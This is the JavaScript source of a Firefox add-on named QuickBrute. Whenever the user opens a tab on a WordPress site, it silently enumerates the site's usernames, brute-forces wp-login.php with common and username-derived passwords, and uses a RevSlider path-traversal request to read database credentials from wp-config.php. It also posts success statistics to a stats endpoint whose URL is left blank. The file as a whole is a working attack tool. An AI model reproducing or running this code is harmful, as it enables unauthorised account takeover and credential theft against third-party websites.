var {
    ToggleButton
} = require('sdk/ui/button/toggle');
var {
    setTimeout
} = require("sdk/timers");
var panels = require("sdk/panel");
var self = require("sdk/self");
var tabs = require("sdk/tabs");
var urls = require("sdk/url");
var requests = require("sdk/request").Request;

var version = "";
var userNames = [];
var passwordList = ["12345", "admin", "123456", "admin123", "11111", "111111", "qwerty"];
var hostname = "";
var sucLogin = [];
var dbCreds = "";
var iswordpress = false;


var button = ToggleButton({
    id: "quickbrute",
    label: "QuickBrute",
    icon: {
        "16": "./Bug-16.png",
        "32": "./Bug-32.png",
        "64": "./Bug-64.png"
    },
    badge: 0,
    badgeColor: "#00AAAA",
    disabled: true,
    onChange: handleClick
});

//PANEL CODES START
var panel = panels.Panel({
    width: 240,
    //height: 300,
    contentURL: self.data.url("panel.html"),
    onHide: handleHide,
    contentScriptFile: self.data.url("panel.js")
});

function handleHide() {
    button.state('window', {
        checked: false
    });
}
//PANEL CODES END

//FUNCTIONS START
String.prototype.hashCode = function() {
    var hash = 5381;
    for (i = 0; i < this.length; i++) {
        char = this.charCodeAt(i);
        hash = ((hash << 5) + hash) + char; /* hash * 33 + c */
    }
    return hash;
}

function getVersionNumber(url) {
    var fullURL = url + "readme.html";
    requests({
        url: fullURL,
        onComplete: function(response) {
            var startIndex = response.text.search("h1");
            var endIndex = response.text.search("</h1>");
            if ((startIndex !== -1 || endIndex !== -1) && response.status === 200) {
                var versionHeader = response.text.slice(startIndex, endIndex);
                startIndex = versionHeader.search("Version");
                versionHeader = versionHeader.slice(startIndex);
                versionHeader = versionHeader.replace("Version", "");
                version = versionHeader.trim();
                button.badge = 1;
            }
        }
    }).get();

    if (version.length === 0) {
        requests({
            url: url,
            onComplete: function(response) {
                var startIndex = response.text.search('name="generator"');
                if (startIndex !== -1 && response.status === 200) {
                    var versionHeader = response.text.slice(startIndex);
                    var endIndex = versionHeader.search("/>");
                    versionHeader = versionHeader.slice(0, endIndex);
                    versionHeader = versionHeader.replace('name="generator" content="WordPress', "");
                    version = versionHeader.replace(/["']/g, "");
                    version = version.trim();
                    button.badge = 1;
                }
            }
        }).get();

    }

}

function getUsernames(url) {
    var fullURL = url + "?author=";
    var requestUrl = "";

    for (i = 1; i < 10; i++) {
        requestUrl = fullURL + i.toString();

        requests({
            url: requestUrl,
            onComplete: function(response) {
                if (response.url.search("author/") !== -1) {
                    var startIndex = response.url.search("author/");
                    var username = response.url.slice(startIndex + 7);
                    username = username.replace("/", "");
                    if (userNames.indexOf(username) == -1) {
                        userNames.push(username);
                    }
                } else if (response.status === 200) {
                    var startIndex = response.text.search("/author/");
                    if (startIndex !== -1) {
                        var username = response.text.slice(startIndex + 8);
                        var endIndex = username.search("/feed/");
                        username = username.slice(0, endIndex);

                        if (userNames.indexOf(username) === -1) {
                            userNames.push(username);
                        }
                    }
                }
                button.badge = 2;
            }
        }).get();
    }
}

function doLogin(url, username, password) {
    requests({
        url: url,
        content: {
            log: username,
            pwd: password
        },
        onComplete: function(response) {
            if (response.url.search("/wp-admin") !== -1) {
                sucLogin.push(username + "/" + password);
            }
        }
    }).post();
}

function bruteForceAttack(url) {

    var fullURL = url + "wp-login.php";

    for (let username of userNames) {
        for (let password of passwordList) {
            doLogin(fullURL, username, password);
        }
        doLogin(fullURL, username, username);
        doLogin(fullURL, username, username + "123");
        doLogin(fullURL, username, username + "1234");
        doLogin(fullURL, username, "123" + username);
        doLogin(fullURL, username, "1234" + username);
    }
}

function revslideWpConfig(url) {
    var checkExtensionUrl = url + "wp-content/plugins/revslider/release_log.txt";
    var exploitUrl = url + "wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
    requests({
        url: checkExtensionUrl,
        onComplete: function(response) {
            if (response.status === 200) {
                requests({
                    url: exploitUrl,
                    onComplete: function(response) {
                        if (response.text.search("DB_USER") !== -1) {
                            var startIndex = response.text.search("DB_USER");
                            var dbUser = response.text.slice(startIndex + 9);
                            var endIndex = dbUser.search(";");
                            dbUser = dbUser.slice(0, endIndex);
                            startIndex = response.text.search("DB_PASSWORD");
                            var dbPass = response.text.slice(startIndex + 13);
                            endIndex = dbPass.search(";");
                            dbPass = dbPass.slice(0, endIndex);
                            dbUser = dbUser.replace(/["')]/g, "").trim();
                            dbPass = dbPass.replace(/["')]/g, "").trim();
                            dbCreds = dbUser + " / " + dbPass;
                        }
                        button.badge = 3;
                    }
                }).get();
            }
        }
    }).get();
}

function isWordpress(url) {
    var fullUrl = url + "robots.txt";
    requests({
        url: fullUrl,
        onComplete: function(response) {
            if (response.text.search("wp-content") !== -1 || response.text.search("wp-admin") !== -1) {
                iswordpress = true;
            }
        }
    }).get();
}

function sendStats(url) {
    var hostID = url.host.hashCode();
    var enumedUser = userNames.length;
    var succLogin = sucLogin.length;
    var dbCredes = 0;
    if (dbCreds.length !== 0) {
        dbCredes = 1;
    }
    var statUrl = "";
    requests({
        url: statUrl,
        content: {
            hostID: hostID,
            enumUser: enumedUser,
            sucLogin: succLogin,
            dbUser: dbCredes
        },
        onComplete: function(response) {
            button.badge = 5;
        }
    }).post();

}
//END OF FUNCTIONS

tabs.on('open', function(tab) {
    userNames = [];
    sucLogin = [];
    iswordpress = false;
    button.badge = 0;

    tab.on('ready', function(tab) {
        var currentUrl = tabs.activeTab.url;
        var hostname = urls.URL(currentUrl);

        if (hostname.host) {
            var cutIndex = hostname.toString().search("\\?");
            if (cutIndex !== -1) {
                hostname = hostname.toString().slice(0, cutIndex);
            }

            isWordpress(hostname);
            setTimeout(function() {

                if (iswordpress === true) {
                    button.state("tab", {
                        disabled: false
                    });

                    getVersionNumber(hostname);
                    getUsernames(hostname);
                    revslideWpConfig(hostname);
                    setTimeout(bruteForceAttack, 10000, hostname);

                    setTimeout(function() {
                        button.badge = 4;
                        sendStats(hostname);
                    }, 15000);
                }
            }, 2000);

        }
    });
});

function handleClick(state) {

    if (state.checked) {
        panel.show({
            position: button
        });
        panel.port.emit("VersionInfo", version);
        panel.port.emit("userList", userNames);
        panel.port.emit("passwordsFound", sucLogin);
        panel.port.emit("dbCreds", dbCreds);
    }
}
